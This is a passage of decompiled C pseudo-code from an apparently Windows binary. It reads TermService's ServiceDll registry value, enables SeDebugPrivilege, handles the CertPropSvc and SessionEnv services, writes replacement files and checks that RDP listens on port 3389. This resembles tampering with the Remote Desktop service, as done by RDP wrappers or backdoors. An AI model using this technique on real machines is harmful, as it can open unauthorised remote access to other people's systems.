    int32_t v12 = (int32_t)&v1; // 0x411537
    int32_t v13 = (int32_t)v4;
    *(int32_t *)(v12 - 4) = 0;
    *(int32_t *)(v12 - 8) = v7;
    hSCManager = 0;
    *(int32_t *)(v12 - 12) = v8;
    *(int32_t *)(v12 - 16) = v9;
    *(int32_t *)(v12 - 20) = 0;
    *(int32_t *)(v12 - 24) = 0;
    *(int32_t *)(v12 - 28) = 3;
    *(int32_t *)(v12 - 32) = 48;
    *(int32_t *)(v12 - 36) = 0;
    *(int32_t *)(v12 - 40) = v13;
    EnumServicesStatusExW((int32_t *)hSCManager, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, &g322, &g322, &g322, (int16_t *)&g322);
    int32_t v14 = function_406f77(); // 0x41155f
    *(int32_t *)(v12 - 44) = 0;
    *(int32_t *)(v12 - 48) = v7;
    *(int32_t *)(v12 - 52) = v8;
    *(int32_t *)(v12 - 56) = v9;
    *(int32_t *)(v12 - 60) = v2;
    *(int32_t *)(v12 - 64) = v14;
    *(int32_t *)(v12 - 68) = 3;
    *(int32_t *)(v12 - 72) = 48;
    *(int32_t *)(v12 - 76) = 0;
    *(int32_t *)(v12 - 80) = v13;
    bool v15 = EnumServicesStatusExW(&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, &g322, &g322, &g322, (int16_t *)&g322); // 0x41157d
    if (!v15) {
        // 0x411587
        if (GetLastError() != 234) {
            // break -> 0x4115de
            break;
        }
    }
    int32_t v16 = v12 - 84; // 0x411594
    *(int32_t *)v16 = v13;
    CloseServiceHandle(&g322);
    int32_t result = 0; // 0x4115a0
    int32_t v17; // 0x4114f4
    int32_t v18; // 0x4114f4
    int32_t v19; // 0x4114f4
    int32_t v20; // 0x4114f4
    int32_t v21; // 0x4114f4
    int32_t v22; // bp-12, 0x4114f4
    int16_t * v23; // 0x4114f4
    int32_t v24; // 0x4114f4
    while (v3 != 0) {
        int32_t v25 = v14;
        int32_t v26 = *(int32_t *)v25; // 0x4115a4
        result = 0;
        if (v26 == 0) {
            // break (via goto) -> 0x4115de
            goto lab_0x4115de_2;
        }
        int32_t v27 = 0;
        int32_t v28 = v16;
        *(int32_t *)(v28 - 4) = v26;
        function_40460a((int16_t *)&g322);
        int32_t v29 = v28 - 8; // 0x4115b3
        *(int32_t *)v29 = v6;
        while (function_404276((int32_t)&g322) == 0) {
            // 0x4115c2
            function_406f1d();
            v22 = 0;
            int32_t v30 = v27 + 1; // 0x4115d1
            result = 0;
            if (v30 >= v3) {
                // break (via goto) -> 0x4115de
                goto lab_0x4115de_2;
            }
            v25 += 44;
            v26 = *(int32_t *)v25;
            result = 0;
            if (v26 == 0) {
                // break (via goto) -> 0x4115de
                goto lab_0x4115de_2;
            }
            // 0x4115a9
            v27 = v30;
            v28 = v29;
            *(int32_t *)(v28 - 4) = v26;
            function_40460a((int16_t *)&g322);
            v29 = v28 - 8;
            *(int32_t *)v29 = v6;
        }
        int32_t v31 = 44 * v27 + v14;
        *(int32_t *)(v28 - 12) = *(int32_t *)v31;
        int32_t v32 = function_40460a((int16_t *)&g322); // 0x4115f6
        int32_t v33 = v28 - 16; // 0x4115fb
        *(int32_t *)v33 = v32;
        function_4043c7((int32_t)&g322);
        function_406f1d();
        *v10 = *(int32_t *)(v31 + 36);
        function_406f1d();
        v22 = 0;
        int32_t v34 = *v10; // 0x411626
        if (v34 != 0) {
            // 0x41166e
            result = 1;
            if (v3 == 0) {
                goto lab_0x4115de_2;
            } else {
                // 0x411681
                v24 = &v22;
                v23 = NULL;
                v17 = v34;
                v19 = v3;
                v18 = v14;
                v21 = v33;
                v20 = 0;
                goto lab_0x411681_2;
            }
        }
        // 0x41162d
        result = 0;
        if (v11 == (int16_t *)1) {
            // break -> 0x4115de
            break;
        }
        // 0x411635
        *(int32_t *)(v28 - 20) = 2;
        *(int32_t *)(v28 - 24) = v6;
        function_410df8(v22, (int32_t)&g322);
        *(int32_t *)(v28 - 28) = v6;
        function_410e64((int32_t)&g322);
        int32_t * v35 = (int32_t *)(v28 - 32); // 0x411646
        *v35 = v14;
        function_401014(1);
        *v35 = 5;
        *(int32_t *)(v28 - 36) = (int32_t)L"ServicesActive";
        v12 = v28 - 40;
        *(int32_t *)v12 = 0;
        int32_t * v36 = OpenSCManagerW((int16_t *)&g322, (int16_t *)&g322, (int32_t)&g322); // 0x411659
        v11 = (int16_t *)1;
        result = 0;
        if (v36 == NULL) {
            // break -> 0x4115de
            break;
        }
        v13 = (int32_t)v36;
        *(int32_t *)(v12 - 4) = 0;
        *(int32_t *)(v12 - 8) = v7;
        hSCManager = 0;
        *(int32_t *)(v12 - 12) = v8;
        *(int32_t *)(v12 - 16) = v9;
        *(int32_t *)(v12 - 20) = 0;
        *(int32_t *)(v12 - 24) = 0;
        *(int32_t *)(v12 - 28) = 3;
        *(int32_t *)(v12 - 32) = 48;
        *(int32_t *)(v12 - 36) = 0;
        *(int32_t *)(v12 - 40) = v13;
        EnumServicesStatusExW((int32_t *)hSCManager, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, &g322, &g322, &g322, (int16_t *)&g322);
        v14 = function_406f77();
        *(int32_t *)(v12 - 44) = 0;
        *(int32_t *)(v12 - 48) = v7;
        *(int32_t *)(v12 - 52) = v8;
        *(int32_t *)(v12 - 56) = v9;
        *(int32_t *)(v12 - 60) = v2;
        *(int32_t *)(v12 - 64) = v14;
        *(int32_t *)(v12 - 68) = 3;
        *(int32_t *)(v12 - 72) = 48;
        *(int32_t *)(v12 - 76) = 0;
        *(int32_t *)(v12 - 80) = v13;
        v15 = EnumServicesStatusExW(&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (char *)&g322, (int32_t)&g322, &g322, &g322, &g322, (int16_t *)&g322);
        if (!v15) {
            // 0x411587
            result = 0;
            if (GetLastError() != 234) {
                // break -> 0x4115de
                break;
            }
        }
        // 0x411594
        v16 = v12 - 84;
        *(int32_t *)v16 = v13;
        CloseServiceHandle(&g322);
        result = 0;
    }
  lab_0x4115de_2:
    // 0x4115de
    function_406f1d();
    return result;
  lab_0x411681_2:;
    int32_t * v37 = (int32_t *)v18; // 0x411681
    int32_t v38 = *v37; // 0x411681
    result = 1;
    int32_t v39; // 0x4114f4
    int32_t v40; // 0x4114f4
    int32_t v41; // 0x4114f4
    int32_t v42; // 0x4114f4
    int32_t v43; // 0x4114f4
    int32_t v44; // 0x4116ad
    if (v38 == 0) {
        goto lab_0x4115de_2;
    } else {
        int32_t v45 = v20;
        int32_t v46 = v21;
        v39 = v17;
        v40 = v19;
        v43 = v46;
        v42 = v45;
        if (*(int32_t *)(v18 + 36) != v17) {
            goto lab_0x4116d4;
        } else {
            int16_t * v47 = v23;
            *(int32_t *)(v46 - 4) = v38;
            function_40460a(v47);
            *(int32_t *)(v46 - 8) = 0;
            int32_t v48 = v46 - 12; // 0x41169a
            *(int32_t *)v48 = v22;
            int32_t v49 = lstrcmpW((int16_t *)&g322, (int16_t *)&g322); // 0x41169d
            v44 = v48;
            v41 = v45;
            if (v49 == 0) {
                goto lab_0x4116bf;
            } else {
                // 0x4116a7
                *(int32_t *)(v46 - 16) = v24;
                v44 = v46 - 20;
                *(int32_t *)v44 = *v37;
                function_40460a((int16_t *)&g322);
                function_402a5c((int32_t)&g322);
                v41 = (int32_t)v47;
                goto lab_0x4116bf;
            }
        }
    }
  lab_0x4116d4:;
    int32_t v50 = v42 + 1; // 0x4116d4
    result = 1;
    v23 = (int16_t *)v50;
    v17 = v39;
    v19 = v40;
    v18 += 44;
    v21 = v43;
    v20 = v50;
    if (v50 < v40) {
        goto lab_0x411681_2;
    } else {
        goto lab_0x4115de_2;
    }
  lab_0x4116bf:
    // 0x4116bf
    function_406f1d();
    v22 = 0;
    v39 = *v10;
    v40 = v3;
    v43 = v44;
    v42 = v41;
    goto lab_0x4116d4;
}

// Address range: 0x4116e4 - 0x411747
int32_t function_4116e4(void) {
    // 0x4116e4
    function_40460a(L"CertPropSvc");
    function_40460a(L"SessionEnv");
    int32_t v1; // bp-12, 0x4116e4
    int32_t v2 = &v1; // 0x411706
    int32_t v3 = v2; // bp-24, 0x411706
    int32_t v4 = function_410ee9(&v1); // 0x411707
    int32_t * v5 = &v3; // 0x41170f
    if (v4 == 4) {
        int32_t v6 = v2; // bp-32, 0x411716
        function_410df8(v2, 3);
        v5 = &v6;
    }
    int32_t v7 = (int32_t)v5;
    int32_t v8; // bp-8, 0x4116e4
    int32_t v9 = &v8; // 0x41171f
    *(int32_t *)(v7 - 4) = v9;
    if (function_410ee9(&g322) == 4) {
        // 0x41172a
        *(int32_t *)(v7 - 8) = 3;
        *(int32_t *)(v7 - 12) = v9;
        function_410df8((int32_t)&g322, (int32_t)&g322);
    }
    // 0x411735
    function_406f1d();
    return function_406f1d();
}

// Address range: 0x411747 - 0x411760
int32_t function_411747(void) {
    // 0x411747
    int32_t v1; // 0x411747
    return function_41337b(v1) != 0;
}

// Address range: 0x411760 - 0x411906
int32_t function_411760(void) {
    int32_t phkResult = 0; // bp-8, 0x411776
    function_40460a(L"SYSTEM\\CurrentControlSet\\Services\\TermService");
    function_40460a(L"SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters");
    int16_t * v1 = NULL; // bp-40, 0x41178e
    int32_t v2 = -0x7ffffffe; // bp-80, 0x4117a4
    int32_t lpSubKey; // 0x411760
    int32_t v3 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, (int16_t *)lpSubKey, 0, 0x20119, (int32_t **)&phkResult); // 0x4117a9
    int32_t v4 = &v2; // 0x4117b3
    int32_t v5; // 0x411760
    int32_t v6; // bp-12, 0x411760
    int32_t v7; // 0x41183b
    if (v3 != 0) {
        goto lab_0x4118e6;
    } else {
        int32_t v8 = function_40460a(L"ImagePath"); // 0x4117c5
        int32_t v9 = v8; // bp-92, 0x4117ca
        int32_t v10 = &v9; // 0x4117ca
        int32_t v11 = function_414d78(v8, (int32_t)&g322); // 0x4117ce
        function_406f1d();
        int32_t hKey = phkResult;
        int32_t v12; // bp-96, 0x411760
        if (v11 != 0) {
            int32_t v13 = v10; // 0x4117f8
            if (hKey != 0) {
                // 0x4117fa
                v12 = hKey;
                RegCloseKey((int32_t *)hKey);
                v13 = &v12;
            }
            // 0x4117ff
            *(int32_t *)(v13 - 4) = (int32_t)&v6;
            phkResult = 0;
            function_403f05(0);
            if (v1 != NULL) {
                // 0x411817
                function_406f66();
            }
            // 0x41181c
            *(int32_t *)(v13 - 8) = (int32_t)L"svchost.exe";
            int32_t v14 = v13 - 12; // 0x411821
            *(int32_t *)v14 = v6;
            v1 = NULL;
            v7 = v14;
            if (StrStrW(NULL, NULL) != NULL) {
                goto lab_0x411848;
            } else {
                // 0x411836
                *(int32_t *)(v13 - 16) = (int32_t)L"svchost.exe -k";
                v7 = v13 - 20;
                *(int32_t *)v7 = v6;
                if (StrStrW((int16_t *)&g322, (int16_t *)&g322) == NULL) {
                    goto lab_0x4118ce;
                } else {
                    goto lab_0x411848;
                }
            }
        } else {
            int32_t v15 = v10; // 0x4117e4
            if (hKey != v11) {
                // 0x4117e6
                v12 = hKey;
                RegCloseKey((int32_t *)hKey);
                v15 = &v12;
            }
            // 0x4117eb
            phkResult = 0;
            v5 = v15;
            goto lab_0x4118da;
        }
    }
  lab_0x4118e6:
    // 0x4118e6
    function_406f1d();
    int32_t result = function_406f1d(); // 0x4118fa
    if (phkResult != 0) {
        // 0x4118fc
        *(int32_t *)(v4 - 4) = phkResult;
        result = RegCloseKey(&g322);
    }
    // 0x411901
    return result;
  lab_0x411848:
    // 0x411848
    *(int32_t *)(v7 - 4) = (int32_t)&phkResult;
    *(int32_t *)(v7 - 8) = 0x20119;
    *(int32_t *)(v7 - 12) = 0;
    int32_t v16 = v7 - 20; // 0x411856
    *(int32_t *)v16 = -0x7ffffffe;
    int32_t v17 = RegOpenKeyExW(&g322, (int16_t *)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t **)&g322); // 0x41185b
    int32_t v18 = v16; // 0x41185f
    if (v17 == 0) {
        // 0x411861
        *(int32_t *)(v7 - 24) = (int32_t)&v1;
        *(int32_t *)(v7 - 28) = (int32_t)L"ServiceDll";
        int32_t v19 = function_40460a((int16_t *)&g322); // 0x41186d
        int32_t v20 = v7 - 32; // 0x411872
        *(int32_t *)v20 = v19;
        int32_t v21 = function_414d78((int32_t)&g322, (int32_t)&g322); // 0x411876
        function_406f1d();
        int32_t v22 = v20; // 0x411887
        if (v21 != 0) {
            // 0x411889
            int32_t v23; // bp-32, 0x411760
            *(int32_t *)(v7 - 36) = (int32_t)&v23;
            function_403f05((int32_t)&g322);
            int32_t v24 = function_404201(); // 0x41189a
            v22 = v7 - 40;
            *(int32_t *)v22 = v24;
            function_4043c7((int32_t)&g322);
            function_406f1d();
            function_406f1d();
        }
        int32_t v25 = phkResult; // 0x4118bf
        int32_t v26 = v22; // 0x4118c3
        if (v25 != 0) {
            // 0x4118c5
            v26 = v22 - 4;
            *(int32_t *)v26 = v25;
            RegCloseKey(&g322);
        }
        // 0x4118ca
        phkResult = 0;
        v18 = v26;
    }
    goto lab_0x4118ce;
  lab_0x4118da:
    // 0x4118da
    v4 = v5;
    if (v1 != NULL) {
        // 0x4118e1
        function_406f66();
        v4 = v5;
    }
    goto lab_0x4118e6;
  lab_0x4118ce:
    // 0x4118ce
    function_406f1d();
    v6 = 0;
    v5 = v18;
    goto lab_0x4118da;
}

// Address range: 0x411906 - 0x41199f
int32_t function_411906(void) {
    // 0x411906
    int32_t v1; // bp-420, 0x411906
    if (WSAStartup(514, (struct WSAData *)&v1) != 0) {
        // 0x41199a
        return 0;
    }
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // 0x411936
    if (sock_fd != -1) {
        int16_t addr = 2; // bp-20, 0x411948
        inet_addr("127.0.0.1");
        htons(3389);
        int32_t v2 = connect(sock_fd, (struct sockaddr *)&addr, 16); // 0x41196b
        int32_t v3 = closesocket(sock_fd);
        if (v2 == -1) {
            // 0x411977
            WSACleanup();
            // 0x41199a
            return 0;
        }
        // 0x411985
        if (v3 != -1) {
            // 0x411992
            WSACleanup();
            // 0x41199a
            return 1;
        }
    }
    // 0x411992
    WSACleanup();
    // 0x41199a
    return 0;
}

// Address range: 0x41199f - 0x411a69
int32_t function_41199f(void) {
    int32_t phkResult = 0; // bp-8, 0x4119b1
    function_40460a(L"SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters");
    int32_t v1 = -0x7ffffffe; // bp-60, 0x4119cb
    int32_t lpSubKey; // 0x41199f
    int32_t v2 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, (int16_t *)lpSubKey, 0, 0x20119, (int32_t **)&phkResult); // 0x4119d3
    int32_t result = 0; // 0x4119db
    int32_t * v3 = &v1; // 0x4119db
    if (v2 == 0) {
        int32_t v4 = function_40460a(L"ServiceDll"); // 0x4119e9
        int32_t v5 = v4; // bp-72, 0x4119ee
        int32_t v6 = function_414d78(v4, (int32_t)&g322); // 0x4119f2
        function_406f1d();
        int32_t v7; // bp-76, 0x41199f
        if (v6 != 0) {
            // 0x411a18
            int32_t v8; // bp-12, 0x41199f
            int32_t v9 = &v8; // 0x411a1b
            v7 = v9;
            function_403f05(v9);
            int32_t v10 = &g290; // bp-80, 0x411a24
            int32_t v11 = function_404276((int32_t)&g290); // 0x411a2b
            function_406f1d();
            v8 = 0;
            result = v11;
            v3 = &v10;
        } else {
            int32_t hKey = phkResult; // 0x411a05
            int32_t * v12 = &v5; // 0x411a08
            if (hKey != 0) {
                // 0x411a0a
                v7 = hKey;
                RegCloseKey((int32_t *)hKey);
                v12 = &v7;
            }
            // 0x411a13
            phkResult = 0;
            result = 0;
            v3 = v12;
        }
    }
    // 0x411a41
    function_406f1d();
    if (phkResult != 0) {
        // 0x411a5a
        *(int32_t *)((int32_t)v3 - 4) = phkResult;
        RegCloseKey(&g322);
    }
    // 0x411a63
    return result;
}

// Address range: 0x411a69 - 0x411eb2
int32_t function_411a69(int32_t a1) {
    // 0x411a69
    int32_t lpCriticalSection; // 0x411a69
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)lpCriticalSection);
    int32_t v1; // 0x411a69
    int32_t v2; // bp-104, 0x411a69
    if (function_4138ef() == 1) {
        // 0x411a98
        function_413473();
        v1 = &v2;
    }
    int32_t v3 = lpCriticalSection + 56; // 0x411aa1
    int16_t * v4 = (int16_t *)*(int32_t *)v3; // 0x411aa4
    int16_t * v5 = v4; // bp-120, 0x411aa4
    bool v6 = PathFileExistsW(v4); // 0x411aa6
    int32_t v7 = v1; // 0x411aae
    int32_t v8 = (int32_t)&v5; // 0x411aae
    if (!v6) {
        // 0x411ab4
        function_404656(v3);
        function_413fdb((int32_t)&g322, (int32_t)&g322);
        int32_t v9 = 0; // bp-136, 0x411ac7
        int32_t v10; // bp-44, 0x411a69
        int32_t v11 = &v10; // 0x411ac8
        int32_t v12 = lpCriticalSection + 64; // 0x411ac9
        function_404656(v12);
        function_413fdb((int32_t)&g322, (int32_t)&g322);
        int32_t v13 = 0; // bp-112, 0x411ae5
        int32_t v14 = function_4138ef(); // 0x411aed
        int32_t v15 = *(int32_t *)(lpCriticalSection + 100);
        int32_t v16; // 0x411a69
        int32_t v17; // 0x411a69
        int32_t v18; // 0x411a69
        int32_t v19; // bp-168, 0x411a69
        int32_t v20; // 0x411a69
        if (v14 != 1) {
            int32_t v21 = function_41780e(&v2, v15, 1); // 0x411b46
            function_403eca(v21);
            function_404081();
            v19 = v9;
            function_403fc7(v9, 0x12e00);
            v18 = v21;
            v16 = v9 + 0x12e00;
            v17 = v9;
            v20 = v11 - 0x12e00;
        } else {
            int32_t v22 = function_41780e(&v2, v15, 2); // 0x411b04
            function_403eca(v22);
            function_404081();
            v19 = v9;
            function_403fc7(v9, 0x1c800);
            v18 = v22;
            v16 = v9 + 0x1c800;
            v17 = v9;
            v20 = v11 - 0x1c800;
        }
        // 0x411b80
        function_403fc7(v16, v20);
        if (v17 == 0) {
            // 0x411b8f
            if (v12 != 0) {
                // 0x411b97
                function_406f66();
            }
            if (v18 != 0) {
                // 0x411ba4
                function_406f66();
            }
            // 0x411ba9
            function_413c16();
            function_413c16();
            // 0x411ea9
            return -1;
        }
        int32_t v23 = &v9; // bp-184, 0x411bc4
        int32_t v24 = function_413b2f(); // 0x411bc9
        int32_t v25; // bp-96, 0x411a69
        int32_t * v26 = &v25; // 0x411bd0
        int32_t * v27 = &v23; // 0x411bd0
        if (v24 != 0) {
            int32_t v28 = &v19; // 0x411bd7
            int32_t v29 = v28; // bp-192, 0x411bd7
            function_413ef9(v28);
            function_413ee1();
            v26 = &v13;
            v27 = &v29;
        }
        int32_t v30 = (int32_t)v27;
        int32_t v31 = (int32_t)v26;
        *(int32_t *)(v30 - 4) = v31;
        int32_t v32 = v30 - 8; // 0x411beb
        *(int32_t *)v32 = v31;
        int32_t v33 = v32; // 0x411bf7
        if (function_413b2f() != 0) {
            // 0x411bf9
            *(int32_t *)(v30 - 12) = v30 + 56;
            v33 = v30 - 16;
            *(int32_t *)v33 = v30 + 24;
            function_413ef9((int32_t)&g322);
            function_413ee1();
        }
        // 0x411c11
        v8 = v33;
        if (*(int32_t *)(v8 + 32) != 0) {
            // 0x411c19
            function_406f66();
        }
        // 0x411c1e
        if (*(int32_t *)(v8 + 16) != 0) {
            // 0x411c26
            function_406f66();
        }
        // 0x411c2b
        function_413c16();
        function_413c16();
        v7 = v8 + 80;
    }
    int32_t v34 = v8;
    int32_t v35 = lpCriticalSection + 60; // 0x411c3d
    int32_t v36 = v34 - 4; // 0x411c40
    *(int32_t *)v36 = *(int32_t *)v35;
    bool v37 = PathFileExistsW((int16_t *)&g322); // 0x411c42
    int32_t v38 = v36; // 0x411c4a
    int32_t result; // 0x411a69
    int32_t v39; // 0x411a69
    if (v37) {
        goto lab_0x411cca;
    } else {
        // 0x411c4c
        *(int32_t *)(v34 - 8) = 0;
        *(int32_t *)(v34 - 12) = v7;
        *(int32_t *)(v34 - 16) = v35;
        function_404656((int32_t)&g322);
        function_413fdb((int32_t)&g322, (int32_t)&g322);
        int32_t v40 = *(int32_t *)(lpCriticalSection + 88); // 0x411c5f
        *(int32_t *)(v34 - 20) = 3;
        *(int32_t *)(v34 - 24) = *(int32_t *)(lpCriticalSection + 100);
        int32_t v41 = v34 - 28; // 0x411c6b
        *(int32_t *)v41 = v34 + 16;
        function_41780e(&g322, (int32_t)&g322, (int32_t)&g322);
        if (*(int32_t *)(v34 + 4) != 0) {
            // 0x411c91
            *(int32_t *)(v34 - 32) = v40;
            int32_t v42 = v34 - 36; // 0x411c92
            *(int32_t *)v42 = v40;
            v38 = v42;
            if (function_413b2f() != 0) {
                // 0x411ca0
                *(int32_t *)(v34 - 40) = v34 + 52;
                v38 = v34 - 44;
                *(int32_t *)v38 = v36;
                function_413ef9((int32_t)&g322);
                function_413ee1();
            }
            // 0x411cb8
            function_404081();
            function_413c16();
            goto lab_0x411cca;
        } else {
            // 0x411c77
            function_404081();
            function_413c16();
            result = -1;
            v39 = v41;
            goto lab_0x411e9c;
        }
    }
  lab_0x411cca:
    // 0x411cca
    function_411760();
    function_411747();
    int32_t v43; // 0x411a69
    if (function_4114f4() != 0) {
        // 0x411cfb
        if (function_41141f() != 0) {
            // 0x411d1f
            function_4116e4();
            *(int32_t *)(v38 - 8) = (int32_t)L"SeDebugPrivilege";
            function_40460a((int16_t *)&g322);
            GetCurrentProcess();
            int32_t v44 = function_4132f4(); // 0x411d3e
            function_406f1d();
            if (v44 != 0) {
                // 0x411d6a
                if (function_414ac7() != 0) {
                    int32_t v45 = v38 - 12; // 0x411d94
                    *(int32_t *)v45 = 1000;
                    Sleep((int32_t)&g322);
                    int32_t * v46 = (int32_t *)(lpCriticalSection + 76); // 0x411d9b
                    int32_t v47 = v45; // 0x411da0
                    if (*v46 != 0) {
                        int32_t v48 = 0; // 0x411dd4
                        function_406d65();
                        *(int32_t *)(v45 - 4) = *(int32_t *)(lpCriticalSection + 68) + 4 * v48;
                        function_404656((int32_t)&g322);
                        int32_t v49 = v45 - 8; // 0x411dc2
                        *(int32_t *)v49 = v45 + 12;
                        function_410e64((int32_t)&g322);
                        function_406f1d();
                        v48++;
                        *(int32_t *)(v45 + 8) = 0;
                        v47 = v49;
                        while (v48 < *v46) {
                            int32_t v50 = v49;
                            function_406d65();
                            *(int32_t *)(v50 - 4) = *(int32_t *)(lpCriticalSection + 68) + 4 * v48;
                            function_404656((int32_t)&g322);
                            v49 = v50 - 8;
                            *(int32_t *)v49 = v50 + 12;
                            function_410e64((int32_t)&g322);
                            function_406f1d();
                            v48++;
                            *(int32_t *)(v50 + 8) = 0;
                            v47 = v49;
                        }
                    }
                    int32_t v51 = v47;
                    *(int32_t *)(v51 - 4) = 500;
                    Sleep((int32_t)&g322);
                    *(int32_t *)(v51 - 8) = lpCriticalSection + 40;
                    function_404656((int32_t)&g322);
                    *(int32_t *)(v51 - 12) = v51 + 8;
                    function_410e64((int32_t)&g322);
                    function_406f1d();
                    *(int32_t *)(v51 - 16) = 1000;
                    Sleep((int32_t)&g322);
                    *(int32_t *)(v51 - 20) = 1;
                    if (function_410f97((int32_t)&g322) != 0) {
                        // 0x411e2f
                        if (function_4138ef() == 1) {
                            // 0x411e39
                            function_41344c();
                        }
                        int32_t v52 = function_411906(); // 0x411e42
                        *(int32_t *)(v51 - 24) = lpCriticalSection + 96;
                        *(int32_t *)(v51 - 28) = lpCriticalSection + 92;
                        int32_t v53 = v51 - 32;
                        int32_t * v54 = (int32_t *)v53;
                        if (v52 != 0) {
                            // 0x411e7b
                            *v54 = 0;
                            int32_t v55 = function_405b49((int32_t)&g322, (int32_t)&g322, (int32_t)&g322); // 0x411e7c
                            *(int32_t *)(v51 - 36) = v55;
                            function_405f32(&g322);
                            function_405b26();
                            LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
                            *(int32_t *)(v51 - 44) = 8;
                            result = 8;
                            v39 = v51 - 40;
                            goto lab_0x411e9c;
                        } else {
                            // 0x411e5a
                            *v54 = 10;
                            v43 = v53;
                            goto lab_0x411e5c;
                        }
                    } else {
                        // 0x411e1c
                        *(int32_t *)(v51 - 24) = lpCriticalSection + 96;
                        *(int32_t *)(v51 - 28) = lpCriticalSection + 92;
                        int32_t v56 = v51 - 32; // 0x411e24
                        *(int32_t *)v56 = 7;
                        v43 = v56;
                        goto lab_0x411e5c;
                    }
                } else {
                    // 0x411d76
                    function_41344c();
                    *(int32_t *)(v38 - 12) = lpCriticalSection + 96;
                    *(int32_t *)(v38 - 16) = lpCriticalSection + 92;
                    int32_t v57 = v38 - 20; // 0x411d87
                    *(int32_t *)v57 = 5;
                    v43 = v57;
                    goto lab_0x411e5c;
                }
            } else {
                // 0x411d52
                function_41344c();
                *(int32_t *)(v38 - 12) = lpCriticalSection + 96;
                *(int32_t *)(v38 - 16) = lpCriticalSection + 92;
                int32_t v58 = v38 - 20; // 0x411d63
                *(int32_t *)v58 = 3;
                v43 = v58;
                goto lab_0x411e5c;
            }
        } else {
            // 0x411d07
            function_41344c();
            *(int32_t *)(v38 - 8) = lpCriticalSection + 96;
            *(int32_t *)(v38 - 12) = lpCriticalSection + 92;
            int32_t v59 = v38 - 16; // 0x411d18
            *(int32_t *)v59 = 6;
            v43 = v59;
            goto lab_0x411e5c;
        }
    } else {
        // 0x411ce3
        function_41344c();
        *(int32_t *)(v38 - 4) = lpCriticalSection + 96;
        *(int32_t *)(v38 - 8) = lpCriticalSection + 92;
        int32_t v60 = v38 - 12; // 0x411cf4
        *(int32_t *)v60 = 4;
        v43 = v60;
        goto lab_0x411e5c;
    }
  lab_0x411e5c:;
    int32_t v61 = function_405b49((int32_t)&g322, (int32_t)&g322, (int32_t)&g322); // 0x411e5c
    *(int32_t *)(v43 - 4) = v61;
    function_405f32(&g322);
    function_405b26();
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
    result = 0;
    v39 = v43 - 8;
    goto lab_0x411e9c;
  lab_0x411e9c:
    // 0x411e9c
    if (*(int32_t *)(v39 + 24) != 0) {
        // 0x411ea4
        function_406f66();
    }
    // 0x411ea9
    return result;
}

// Address range: 0x411eb2 - 0x411ec1
int32_t function_411eb2(int32_t a1) {
    // 0x411eb2
    int32_t v1; // 0x411eb2
    return function_411a69(v1);
}

// Address range: 0x411ec1 - 0x411f55
int32_t function_411ec1(void) {
    // 0x411ec1
    function_406f1d();
    int32_t v1; // 0x411ec1
    *(int32_t *)(v1 + 96) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 92) = 0;
    function_402b12();
    function_406f1d();
    *(int32_t *)(v1 + 64) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 60) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 56) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 52) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 48) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 40) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 36) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 32) = 0;
    int32_t hObject = *(int32_t *)(v1 + 24); // 0x411f3d
    if (hObject != 0) {
        // 0x411f42
        CloseHandle((int32_t *)hObject);
    }
    // 0x411f4b
    DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
    return &g322;
}

// Address range: 0x411f55 - 0x4120e9
int32_t function_411f55(int32_t a1) {
    struct _RTL_CRITICAL_SECTION * v1 = (struct _RTL_CRITICAL_SECTION *)&g283; // bp-44, 0x411f74
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g283);
    function_413473();
    int32_t v2 = function_4114f4(); // 0x411f89
    int32_t v3 = (int32_t)&v1; // 0x411f96
    if (v2 != 0) {
        int16_t * v4 = L"SeDebugPrivilege"; // bp-48, 0x411f98
        function_40460a(L"SeDebugPrivilege");
        GetCurrentProcess();
        int32_t v5 = function_4132f4(); // 0x411fb1
        function_406f1d();
        v3 = (int32_t)&v4;
        if (v5 != 0) {
            // 0x411fc4
            function_414ac7();
            int32_t v6 = 1000; // bp-52, 0x411fcf
            Sleep(1000);
            v3 = &v6;
        }
    }
    // 0x411fd6
    *(int32_t *)(v3 - 4) = (int32_t)&g114;
    function_40460a((int16_t *)&g322);
    int32_t v7; // bp-28, 0x411f55
    *(int32_t *)(v3 - 8) = (int32_t)&v7;
    function_41141f();
    int32_t v8 = v3 - 12; // 0x411ff7
    *(int32_t *)v8 = (int32_t)L"rudp";
    int32_t v9 = function_40460a((int16_t *)&g322); // 0x411ffc
    int32_t v10 = v8; // 0x412004
    if (*(int32_t *)g298 != 0) {
        // 0x412006
        v10 = v3 - 16;
        *(int32_t *)v10 = v9;
        function_414d03((int32_t)&g322);
    }
    // 0x41200e
    function_406f1d();
    int32_t v11 = v10 - 4; // 0x41201f
    *(int32_t *)v11 = (int32_t)L"rpdp";
    int32_t v12 = function_40460a((int16_t *)&g322); // 0x412024
    int32_t v13 = v11; // 0x41202c
    if (*(int32_t *)g298 != 0) {
        // 0x41202e
        v13 = v10 - 8;
        *(int32_t *)v13 = v12;
        function_414d03((int32_t)&g322);
    }
    // 0x412036
    function_406f1d();
    int32_t v14; // bp-20, 0x411f55
    *(int32_t *)(v13 - 4) = v14;
    int32_t v15 = v13 - 8; // 0x412041
    *(int32_t *)v15 = (int32_t)&g291;
    function_404656((int32_t)&g322);
    function_413c34((int32_t)&g322);
    *(int32_t *)(v13 - 12) = (int32_t)&g292;
    function_404656((int32_t)&g322);
    function_413c34((int32_t)&g322);
    int32_t v16 = v15; // 0x41206b
